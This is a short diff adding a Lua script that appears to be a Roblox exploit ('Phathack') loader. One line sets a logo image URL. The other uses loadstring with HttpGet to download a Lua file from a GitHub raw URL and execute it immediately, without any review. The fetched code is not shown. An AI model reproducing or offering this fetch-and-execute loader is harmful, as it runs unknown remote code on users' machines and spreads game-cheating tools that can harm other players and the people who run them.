@@ -1,0 +1,2 @@
+_G.Logo = "https://www.roblox.com/library/10842366988/anime-girl" -- Enter Your ID Image Here
+loadstring(Game:HttpGet" https://raw.githubusercontent.com/Mr1phat/Phathack/main/phat.lua.txt")()
